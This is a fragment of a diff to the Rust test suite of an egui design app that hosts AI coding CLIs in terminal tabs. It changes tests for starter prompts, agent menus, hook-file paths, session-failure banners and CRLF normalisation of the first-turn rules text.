             egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
             egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
         ]
-    }
-
-    /// The shipped default view (terminal, not chat): a click on a starter prompt opens the first installed CLI, fills the
-    /// composer, keeps the composer focused on the frames after the click and writes nothing to the PTY.
-    #[test]
-    fn clicking_a_starter_prompt_in_the_default_terminal_view_opens_a_session_and_fills_the_composer() {
-        use crate::agent_sample_prompts::sample_prompts;
-
-        let stub_dir = install_stub_claude("default-view-click");
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68813);
-        assert!(st.side_panel_pty_open, "precondition: the default view is the terminal");
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        pin_installed_catalog_clis(&mut st, &[AgentCliPreset::Claude]);
-        assert!(st.tabs.is_empty(), "precondition: no session is open");
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let row0 = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("the starter prompts are drawn in the terminal view");
-
-        let mut actions = Vec::new();
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), events: click_events(row0.center()), ..Default::default() }, |ui| {
-            actions = show_left(&mut st, ui, panel_rect, None);
-        });
-        assert!(actions.is_empty(), "a prompt click emits no TerminalAction: {actions:?}");
-
-        // Two more frames: the new tab's terminal viewport draws now and must not take the focus away.
-        for _ in 0..2 {
-            let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-        }
-        assert_eq!(st.tabs.len(), 1, "the click opens exactly one session");
-        assert_eq!(st.active_tab().unwrap().spawn_preset, AgentCliPreset::Claude, "the first installed CLI starts");
-        assert_eq!(st.composer_draft(), sample_prompts(st.prompt_context)[0].text.as_str(), "the draft is the prompt text");
-        assert!(st.active_tab().unwrap().written_bytes.is_empty(), "a prompt click never writes to the PTY");
-        assert!(!st.viewport_focused, "the terminal viewport must not keep the keyboard");
-        assert!(ctx.memory(|m| m.has_focus(Id::new("agents-ask-for-changes-input"))), "the composer stays focused after the click");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
     }
 
     /// The install check reads the picker's cached probes, not the PATH, so it costs nothing per frame and agrees with the rows.
@@ -11507,9 +12795,9 @@ mod tests {
         let _ = std::fs::remove_dir_all(&stub_dir);
     }
 
-    /// A saved "Other CLI…" entry counts as an agent CLI: the prompts show and a click starts that command.
+    /// A saved "Other CLI…" entry counts as a startable CLI: it is a row of the agent menu, and a click starts that command.
     #[test]
-    fn a_saved_other_cli_counts_and_a_prompt_click_starts_it() {
+    fn a_saved_other_cli_counts_and_a_menu_click_starts_it() {
         let root = std::env::temp_dir().join(format!("designos-688-custom-cli-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&root);
         std::fs::create_dir_all(&root).expect("create settings root");
@@ -11526,77 +12814,18 @@ mod tests {
         pin_installed_catalog_clis(&mut st, &[]);
         assert!(st.any_agent_cli_installed(), "a saved custom CLI is startable");
 
+        st.runtime_dropdown_open = true;
         let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
             let _ = show_left(&mut st, ui, panel_rect, None);
         });
-        let row0 = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("the prompts are drawn when a custom CLI is saved");
+        let row0 = empty_state_rect(&ctx, "agents-dropdown-custom-0").expect("the saved CLI is a row of the agent menu");
         let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), events: click_events(row0.center()), ..Default::default() }, |ui| {
             let _ = show_left(&mut st, ui, panel_rect, None);
         });
         assert_eq!(st.tabs.len(), 1, "the click starts the saved command");
         assert_eq!(st.tabs[0].spawned_command.as_deref(), Some("/bin/sleep 5"));
-        assert!(st.sample_prompt_error.is_none());
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&root);
-    }
-
-    /// A start failure is painted under the prompts instead of vanishing into an unseen status line.
-    #[test]
-    fn a_start_failure_is_painted_under_the_prompts() {
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68816);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.sample_prompt_error = Some("Couldn't start Claude Code.".to_string());
-        let out = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let (texts, _) = crate::lint::scan_shapes(&out.shapes);
-        assert!(texts.iter().any(|t| t.text == "Couldn't start Claude Code."), "the failure line must be painted: {texts:?}");
-        assert!(empty_state_rect(&ctx, "agents-start-error").is_some());
-        kill_tabs(&mut st);
-    }
-
-    /// An exited active tab's draft follows the click onto the other live tab instead of staying behind.
-    #[test]
-    fn a_draft_on_an_exited_tab_follows_the_click_to_another_live_tab() {
-        use crate::agent_sample_prompts::sample_prompts;
-
-        let stub_dir = install_stub_claude("draft-follows");
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0));
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68817);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        st.spawn_tab(AgentCliPreset::Claude, None).expect("spawn the live claude stub");
-        spawn_stub_exiting_agent_into(&mut st);
-        assert!(wait_until_tab_exits(&mut st), "the second agent tab must exit");
-        assert_eq!(st.active_tab, 1, "precondition: the exited tab is active");
-        st.tabs[1].composer.draft = "Keep the header intact.".to_string();
-
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let row0 = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("prompt row recorded");
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), events: click_events(row0.center()), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        assert_eq!(st.tabs.len(), 2, "the live tab is reused, no third tab");
-        assert_eq!(st.active_tab, 0, "the live tab takes over");
-        let prompt = &sample_prompts(st.prompt_context)[0].text;
-        assert!(st.tabs[0].composer.draft.contains("Keep the header intact."), "the exited tab's text moved: {:?}", st.tabs[0].composer.draft);
-        assert!(st.tabs[0].composer.draft.ends_with(prompt.as_str()), "the prompt is appended after it: {:?}", st.tabs[0].composer.draft);
-        assert!(st.tabs[1].composer.draft.is_empty(), "moved, not copied");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
     }
 
     #[test]
@@ -11611,61 +12840,6 @@ mod tests {
         assert!(st.tabs[idx].usage.elapsed_since_last_poll().is_some(), "a stopped turn consumed tokens, so the readout refreshes");
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
-    }
-
-    #[test]
-    fn header_strip_shows_usage_only_when_active_tab_has_a_reading() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-
-        let mut st = isolated_683_state(760);
-        // Active Codex tab: no reading -> no agents-header-usage rect.
-        let mut codex_tab = TerminalTab::spawn(1, AgentCliPreset::Shell, 24, 80, None).expect("spawn stub tab");
-        codex_tab.spawn_preset = AgentCliPreset::Codex;
-        codex_tab.usage = crate::agent_usage::TabUsageTracker::new(None);
-
-        let mut claude_tab = TerminalTab::spawn(2, AgentCliPreset::Shell, 24, 80, None).expect("spawn stub tab");
-        claude_tab.spawn_preset = AgentCliPreset::Claude;
-        claude_tab.usage = crate::agent_usage::TabUsageTracker::new(Some(crate::agent_usage::UsageReading {
-            input: 41_000,
-            output: 1_300,
-            cost: None,
-            source: crate::agent_usage::UsageSource::ClaudeTranscript,
-            as_of_ms: 1,
-        }));
-
-        let mut agy_tab = TerminalTab::spawn(3, AgentCliPreset::Shell, 24, 80, None).expect("spawn stub tab");
-        agy_tab.spawn_preset = AgentCliPreset::Antigravity;
-        agy_tab.usage = crate::agent_usage::TabUsageTracker::new(None);
-
-        st.tabs = vec![codex_tab, claude_tab, agy_tab];
-        st.active_tab = 0;
-
-        let raw = egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() };
-        let _ = ctx.run_ui(raw.clone(), |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let codex_rect: Option<Rect> = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-header-usage".to_string()))));
-        assert!(codex_rect.is_none(), "Codex tab must not paint agents-header-usage: {codex_rect:?}");
-
-        // Switch to the Claude tab with a reading -> agents-header-usage is painted.
-        st.active_tab = 1;
-        let _ = ctx.run_ui(raw.clone(), |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let claude_rect: Option<Rect> = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-header-usage".to_string()))));
-        assert!(claude_rect.is_some(), "Claude tab with reading must paint agents-header-usage");
-
-        // Switch to the Antigravity tab -> agents-header-usage is not painted.
-        st.active_tab = 2;
-        let _ = ctx.run_ui(raw, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let agy_rect: Option<Rect> = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-header-usage".to_string()))));
-        assert!(agy_rect.is_none(), "Antigravity tab must not paint agents-header-usage: {agy_rect:?}");
-        kill_tabs(&mut st);
     }
 
     #[test]
@@ -11685,7 +12859,7 @@ mod tests {
                 log.push_str("API Error: 529 overloaded_error\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -11725,7 +12899,7 @@ mod tests {
                 log.push_str("API Error: 529 overloaded_error\n");
             }
         }
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -11748,7 +12922,7 @@ mod tests {
         let tab = TerminalTab::spawn_with_session_cmd(1, AgentCliPreset::Claude, 24, 80, None, None, Some(cmd)).expect("spawn stub tab");
         st.tabs = vec![tab];
         st.active_tab = 0;
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         let raise_failure = |st: &mut TerminalState| {
             if let Some(t) = st.active_tab_mut() {
@@ -11770,7 +12944,7 @@ mod tests {
         }
         let outcome = st.send_system_prompt("make the hero card blue", None);
         assert_eq!(outcome, crate::agent_composer::SendOutcome::Queued, "a busy tab queues the prompt");
-        assert!(st.active_tab().is_some_and(|t| t.composer.pending_send.is_some()), "the prompt waits for a quiet tab");
+        assert!(st.active_tab().is_some_and(|t| !t.composer.pending_send.is_empty()), "the prompt waits for a quiet tab");
         assert!(st.active_tab().and_then(|t| t.session_failure.as_ref()).is_none(), "a queued prompt starts a new turn and clears the banner when it is sent");
 
         // A new failure arrives while the prompt still waits, then the tab turns ready and the prompt is written.
@@ -11780,7 +12954,7 @@ mod tests {
             t.spawned_at = std::time::Instant::now() - crate::agent_start_failure::START_FAILURE_WINDOW - std::time::Duration::from_secs(1);
         }
         st.tick_composer();
-        assert!(st.active_tab().is_some_and(|t| t.composer.pending_send.is_none()), "the ready tab flushed the queued prompt");
+        assert!(st.active_tab().is_some_and(|t| t.composer.pending_send.is_empty()), "the ready tab flushed the queued prompt");
         assert_eq!(st.active_tab().and_then(|t| t.last_user_prompt.as_deref()), Some("make the hero card blue"));
         assert!(st.active_tab().and_then(|t| t.session_failure.as_ref()).is_some(), "the queued write must not wipe a failure that arrived while it waited");
         kill_tabs(&mut st);
@@ -11867,7 +13041,7 @@ mod tests {
     fn a_stale_turn_offset_inside_a_multibyte_char_does_not_panic_the_stop_failure_scan() {
         let mut st = provisioned_session(686_010);
         quiet_claude_tab_into(&mut st);
-        let hooks = read_json(&st.session_dir.join("hooks.json"));
+        let hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         kill_tabs_after(&mut st, |st| {
             let tab = st.active_tab_mut().unwrap();
@@ -11880,6 +13054,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn a_stale_turn_offset_inside_a_multibyte_char_does_not_panic_the_exit_scan() {
         let mut st = exited_stub_state();
         kill_tabs_after(&mut st, |st| {
@@ -11895,6 +13070,7 @@ mod tests {
     /// The reader trims the front of the log past `MAX_RAW_LOG_BYTES` while a turn is open. The turn start that was
     /// recorded before the trim must still point at the turn's own first byte, not at whatever now sits there.
     #[test]
+    #[cfg_attr(windows, ignore = "runs POSIX sh script reading /dev/zero via single-quoted path")]
     fn a_log_trim_inside_an_open_turn_keeps_the_scan_on_that_turns_output() {
         let script = pty_fixture_path(&format!("dos-686-open-turn-trim-{}.sh", std::process::id()));
         std::fs::write(
@@ -11937,6 +13113,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg_attr(windows, ignore = "uses exited_stub_state which spawns POSIX sh and waits on POSIX PTY master reader_eof")]
     fn retry_does_nothing_on_an_exited_tab() {
         let mut st = exited_stub_state();
         let failure = agent_session_failure::classify_session_failure(AgentCliPreset::Claude, None, "API Error: 529 overloaded_error\n").expect("classified");
@@ -11966,7 +13143,7 @@ mod tests {
         st.tabs = vec![tab1, tab2];
         st.active_tab = 1; // Shell tab is active while Claude tab finishes with StopFailure
 
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         let stop_failure_cmd = claude_hooks["hooks"]["StopFailure"][0]["hooks"][0]["command"].as_str().expect("StopFailure hook command").to_string();
         run_hook_command(&stop_failure_cmd);
         let _ = st.poll_live_agent_bridge();
@@ -11997,7 +13174,7 @@ mod tests {
         let _ = st.poll_live_agent_bridge();
         assert_eq!(st.active_tab().and_then(|t| t.session_failure.as_ref().map(|f| f.class)), Some(SessionFailureClass::RateLimited));
 
-        let claude_hooks = read_json(&st.session_dir.join("hooks.json"));
+        let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st));
         for hook_name in ["PreToolUse", "PostToolUse"] {
             let tool_cmd = claude_hooks["hooks"][hook_name][0]["hooks"][0]["command"].as_str().expect("tool hook command").to_string();
             run_hook_command(&tool_cmd);
@@ -12244,7 +13421,7 @@ mod tests {
 
         /// Command of the Claude `UserPromptSubmit` hook currently provisioned in `st`'s session dir.
         fn claude_prompt_hook_command(st: &TerminalState) -> String {
-            let hooks = read_json(&st.session_dir.join("hooks.json"));
+            let hooks = read_json(&crate::agent_permissions::claude_hooks_path(st));
             hooks["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"].as_str().expect("UserPromptSubmit command").to_string()
         }
 
@@ -12367,6 +13544,25 @@ mod tests {
         }
 
         #[test]
+        fn first_turn_rules_with_crlf_line_endings_fit_under_token_cap_and_normalize_to_lf() {
+            let (doc, page) = light_rules_doc();
+            let crlf_rules = designos_mcp::rules::GENERATED_RULES_MD.replace("\r\n", "\n").replace('\n', "\r\n");
+            assert!(crlf_rules.contains("\r\n"), "precondition: CRLF rules input");
+
+            let opts = designos_export::agent_context::BootstrapOptions { current_page_id: Some(page), ..Default::default() };
+            let boot = designos_export::agent_context::bootstrap(&doc, &opts, &doc.library.enabled, &crlf_rules);
+            let rules_sec = boot.sections.iter().find(|s| s.id == "rules").expect("rules section");
+            assert!(
+                !rules_sec.truncated && rules_sec.tokens <= designos_export::agent_context::CAP_RULES_TOKENS,
+                "CRLF rules pack must not exceed the 6,000-token cap: truncated={}, tokens={}",
+                rules_sec.truncated,
+                rules_sec.tokens
+            );
+            assert!(!rules_sec.content.contains('\r'), "rules section must normalize CRLF to LF");
+            assert_eq!(rules_sec.content, designos_mcp::rules::GENERATED_RULES_MD.trim());
+        }
+
+        #[test]
         fn first_turn_rules_leave_out_a_tool_the_session_disables() {
             let (doc, page) = light_rules_doc();
             let mut st = isolated_683_state(8621);
@@ -12388,7 +13584,7 @@ mod tests {
             assert!(!first_prompt.contains("### `designos_delete_node`"), "the Claude first-turn block must not list a disabled tool");
 
             // The compact fallback the hook prints when the full build is late carries the same pack.
-            let compact_reply = read_json(&st.session_dir.join("bootstrap-compact-reply.json"));
+            let compact_reply = read_json(&st.prepared_hook_paths().compact_reply());
             let compact = compact_reply["hookSpecificOutput"]["additionalContext"].as_str().expect("additionalContext");
             assert!(
                 compact.contains("### `designos_create_node`") && !compact.contains("### `designos_delete_node`"),
@@ -12759,7 +13955,7 @@ mod tests {
             st_claude.start_bootstrap_job_held(fx.doc.clone_without_images(), fx.page1, Some(file_path.clone()), Some(hold));
             let build = in_flight_job(&st_claude);
 
-            let claude_hooks = read_json(&st_claude.session_dir.join("hooks.json"));
+            let claude_hooks = read_json(&crate::agent_permissions::claude_hooks_path(&st_claude));
             let hook_cmd = claude_hooks["hooks"]["UserPromptSubmit"][0]["hooks"][0]["command"].as_str().unwrap();
             let hook_turn_1 = run_hook_command(hook_cmd);
             assert!(!job_is_done(&build), "Claude hook must bound its wait: it answered while the full build was still held back");
